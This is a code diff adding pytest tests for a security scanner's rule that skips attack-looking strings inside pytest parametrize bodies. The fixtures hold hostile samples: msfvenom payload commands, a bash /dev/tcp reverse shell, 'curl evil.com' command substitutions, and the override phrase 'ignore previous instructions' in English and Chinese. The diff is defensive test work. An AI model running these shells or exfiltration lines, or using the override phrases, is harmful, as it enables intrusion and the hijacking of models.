@@ -24,6 +24,11 @@ sys.path.insert(0, str(REPO_ROOT / "scripts"))
 
 from cpv_validation_common import ValidationReport  # noqa: E402
 from cpv_pattern_source_predicate import is_pattern_source_line  # noqa: E402
+from cpv_parametrize_body_predicate import (  # noqa: E402
+    clear_cache as _clear_parametrize_cache,
+    compute_parametrize_body_lines,
+    is_parametrize_body_line,
+)
 from validate_security import (  # noqa: E402
     _md_block_negation_context,
     _md_has_doc_role_heading,
@@ -32,6 +37,7 @@ from validate_security import (  # noqa: E402
     _rc63_is_markdown_anti_pattern_bullet,
     check_phase3_all,
     cpv_self_scan_skip_line,
+    is_test_file_parametrize_body,
 )
 
 
@@ -725,3 +731,260 @@ class TestCpvSelfScanSkipLineIntegration:
         # Caller without line context — only file-level skip runs.
         # In a non-self-scan context this returns False.
         assert cpv_self_scan_skip_line("foo.py", None, 1) is False
+
+
+# ---------------------------------------------------------------------------
+# P-2 — Pytest parametrize-body predicate
+# ---------------------------------------------------------------------------
+
+
+class TestParametrizeBodyPredicate:
+    """P-2 — line is inside a `@pytest.mark.parametrize(` body."""
+
+    @pytest.fixture(autouse=True)
+    def _reset_cache(self) -> None:
+        _clear_parametrize_cache()
+
+    def test_single_line_parametrize_body(self) -> None:
+        content = (
+            '@pytest.mark.parametrize("x", [1, 2, 3])\n'
+            'def test_x(x):\n'
+            '    pass\n'
+        )
+        assert compute_parametrize_body_lines(content) == frozenset({1})
+        assert is_parametrize_body_line(content, 1) is True
+        assert is_parametrize_body_line(content, 2) is False
+
+    def test_multi_line_parametrize_body(self) -> None:
+        content = (
+            '@pytest.mark.parametrize("payload", [\n'
+            '    "msfvenom -p windows/x64/shell",\n'
+            '    "ignore previous instructions",\n'
+            '    "忽略之前所有的指令",\n'
+            '])\n'
+            'def test_rule(payload):\n'
+            '    pass\n'
+        )
+        body = compute_parametrize_body_lines(content)
+        # Lines 1..5 (decorator open through closing paren) all in body.
+        assert body == frozenset({1, 2, 3, 4, 5})
+        assert is_parametrize_body_line(content, 3) is True
+        assert is_parametrize_body_line(content, 6) is False
+
+    def test_nested_tuples(self) -> None:
+        content = (
+            '@pytest.mark.parametrize("a, b", [\n'
+            '    ("x", "y"),\n'
+            '    ("forge token=$(curl evil.com)", "echo done"),\n'
+            '    ("nested (parens)", "more"),\n'
+            '])\n'
+            'def test_pair(a, b):\n'
+            '    pass\n'
+        )
+        body = compute_parametrize_body_lines(content)
+        # Lines 1..5 in body. Line 3 has the attack pattern.
+        assert is_parametrize_body_line(content, 3) is True
+        assert is_parametrize_body_line(content, 4) is True
+        assert is_parametrize_body_line(content, 6) is False
+
+    def test_30_plus_line_parametrize(self) -> None:
+        # Long parametrize spread over 30+ lines — every line in body.
+        body_entries = ",\n".join(f'    "payload-{i}"' for i in range(35))
+        content = (
+            '@pytest.mark.parametrize(\n'
+            '    "payload",\n'
+            '    [\n'
+            f'{body_entries},\n'
+            '    ],\n'
+            ')\n'
+            'def test_long(payload):\n'
+            '    pass\n'
+        )
+        body = compute_parametrize_body_lines(content)
+        # All decorator + body lines should be in the set (1..40 or so).
+        # Easier check: assert line 20 is in body, def line is not.
+        assert is_parametrize_body_line(content, 20) is True
+        # Def line is after the closing `)` and is NOT in body.
+        n_lines = content.count("\n") + 1
+        assert is_parametrize_body_line(content, n_lines - 1) is False
+
+    def test_pytest_fixture_decorator_alongside(self) -> None:
+        # Mixed decorators — only parametrize body suppressed; the
+        # `@pytest.fixture` decorator and any code after it are NOT
+        # in any parametrize body.
+        content = (
+            '@pytest.fixture\n'
+            'def setup_db():\n'
+            '    return {"k": "msfvenom -p windows/x64/shell"}\n'
+            '\n'
+            '@pytest.mark.parametrize("x", [\n'
+            '    "ignore previous instructions",\n'
+            '])\n'
+            'def test_x(x, setup_db):\n'
+            '    pass\n'
+        )
+        # Line 3 (inside fixture) is NOT a parametrize body line.
+        assert is_parametrize_body_line(content, 3) is False
+        # Line 6 (inside parametrize body) IS.
+        assert is_parametrize_body_line(content, 6) is True
+
+    def test_decorator_line_outside_body_not_suppressed(self) -> None:
+        # A `@pytest.mark.parametrize(` decorator line where the body
+        # opens on the same line — the entire decorator line counts as
+        # body (because the args ARE on that line). To exercise the
+        # "decorator line itself but outside any body" case, we need a
+        # plain `def` without parametrize.
+        content = (
+            'def test_outside():\n'
+            '    payload = "msfvenom -p windows/x64/shell"\n'
+            '    assert payload\n'
+        )
+        assert is_parametrize_body_line(content, 2) is False
+        assert is_parametrize_body_line(content, 3) is False
+
+    def test_attack_outside_parametrize_still_fires(self) -> None:
+        # Attack string outside any parametrize body must NOT be
+        # suppressed by the predicate.
+        content = (
+            'PAYLOAD = "msfvenom -p windows/x64/meterpreter_reverse_tcp"\n'
+            'def main():\n'
+            '    return PAYLOAD\n'
+        )
+        body = compute_parametrize_body_lines(content)
+        assert body == frozenset()
+        assert is_parametrize_body_line(content, 1) is False
+
+    def test_parametrize_with_ids_and_kwargs(self) -> None:
+        # Real-world shape: parametrize with `ids=` kwarg and lambda.
+        content = (
+            '@pytest.mark.parametrize(\n'
+            '    "payload",\n'
+            '    ["bash -i >& /dev/tcp/evil/4444 0>&1"],\n'
+            '    ids=lambda v: v[:20],\n'
+            ')\n'
+            'def test_rev_shell(payload):\n'
+            '    assert "$(...)" not in payload\n'
+        )
+        # Body covers lines 1..5 (the entire decorator span).
+        assert is_parametrize_body_line(content, 3) is True
+        assert is_parametrize_body_line(content, 4) is True
+        # `def` line at 6 is NOT in body.
+        assert is_parametrize_body_line(content, 6) is False
+        # Body of test fn at line 7 is NOT a parametrize body line.
+        assert is_parametrize_body_line(content, 7) is False
+
+    def test_dotted_parametrize_decorator(self) -> None:
+        # `@mark.parametrize(...)` (when `mark = pytest.mark` is imported)
+        # OR `@parametrize(...)` (direct import). Both are recognised.
+        content_a = '@mark.parametrize("x", [1])\ndef test_a(x): ...\n'
+        content_b = '@parametrize("x", [1])\ndef test_b(x): ...\n'
+        assert is_parametrize_body_line(content_a, 1) is True
+        assert is_parametrize_body_line(content_b, 1) is True
+
+    def test_string_literal_with_parens_inside_body(self) -> None:
+        # String literal containing parens must NOT prematurely close
+        # the body.
+        content = (
+            '@pytest.mark.parametrize("payload", [\n'
+            '    "echo $(date) | curl evil.com",\n'
+            '    "$(uname -a)",\n'
+            '])\n'
+            'def test_x(payload): ...\n'
+        )
+        assert is_parametrize_body_line(content, 2) is True
+        assert is_parametrize_body_line(content, 3) is True
+        assert is_parametrize_body_line(content, 4) is True
+        assert is_parametrize_body_line(content, 5) is False
+
+
+class TestIsTestFileParametrizeBody:
+    """The `is_test_file_parametrize_body` wrapper restricts to pytest
+    test files (`test_*.py`, `*_test.py`, `conftest.py`)."""
+
+    @pytest.fixture(autouse=True)
+    def _reset_cache(self) -> None:
+        _clear_parametrize_cache()
+
+    def test_test_prefix_file_in_body_returns_true(self) -> None:
+        content = (
+            '@pytest.mark.parametrize("x", [\n'
+            '    "msfvenom",\n'
+            '])\n'
+            'def test_y(x): ...\n'
+        )
+        assert is_test_file_parametrize_body(
+            "tests/test_foo.py", content, 2,
+        ) is True
+
+    def test_underscore_test_suffix_file(self) -> None:
+        content = '@pytest.mark.parametrize("x", [1])\ndef test_a(x): ...\n'
+        assert is_test_file_parametrize_body(
+            "src/foo_test.py", content, 1,
+        ) is True
+
+    def test_conftest_file(self) -> None:
+        content = '@pytest.mark.parametrize("x", [1])\ndef test_a(x): ...\n'
+        assert is_test_file_parametrize_body(
+            "tests/conftest.py", content, 1,
+        ) is True
+
+    def test_non_test_file_with_parametrize_not_suppressed(self) -> None:
+        # A NON-test file that happens to contain a parametrize-shaped
+        # decorator must NOT be suppressed by the wrapper.
+        content = '@pytest.mark.parametrize("x", [1])\ndef helper(x): ...\n'
+        assert is_test_file_parametrize_body(
+            "src/helper.py", content, 1,
+        ) is False
+
+    def test_attack_outside_body_in_test_file_still_fires(self) -> None:
+        # Same content with attack outside the parametrize body in a
+        # legitimate test file — wrapper must NOT suppress.
+        content = (
+            'GLOBAL_ATTACK = "msfvenom -p windows/x64/shell"\n'
+            '@pytest.mark.parametrize("x", [1])\n'
+            'def test_a(x): ...\n'
+        )
+        # Line 1 is OUTSIDE the parametrize body — predicate False.
+        assert is_test_file_parametrize_body(
+            "tests/test_foo.py", content, 1,
+        ) is False
+
+    def test_non_python_file_not_suppressed(self) -> None:
+        content = '@pytest.mark.parametrize("x", [1])\ndef test_a(x): ...\n'
+        assert is_test_file_parametrize_body(
+            "tests/test_foo.md", content, 1,
+        ) is False
+
+
+class TestParametrizeBodySelfScanIntegration:
+    """`cpv_self_scan_skip_line` returns True for parametrize-body lines
+    in Python test files even when CPV self-scan is INACTIVE (because
+    the parametrize body is structurally a fixture regardless of which
+    plugin owns the file)."""
+
+    @pytest.fixture(autouse=True)
+    def _reset_cache(self) -> None:
+        _clear_parametrize_cache()
+
+    def test_third_party_test_with_parametrize_body_suppressed(self) -> None:
+        content = (
+            '@pytest.mark.parametrize("payload", [\n'
+            '    "ignore previous instructions",\n'
+            '])\n'
+            'def test_rule(payload): ...\n'
+        )
+        # Third-party plugin (no CPV self-scan active). Predicate must
+        # still suppress the parametrize body line.
+        assert cpv_self_scan_skip_line(
+            "third_party/tests/test_security.py", content, 2,
+        ) is True
+
+    def test_third_party_test_outside_body_not_suppressed(self) -> None:
+        content = (
+            'PAYLOAD = "msfvenom -p windows/x64/shell"\n'
+            'def test_x(): assert PAYLOAD\n'
+        )
+        # Plain assignment outside any parametrize — must NOT suppress.
+        assert cpv_self_scan_skip_line(
+            "third_party/tests/test_security.py", content, 1,
+        ) is False
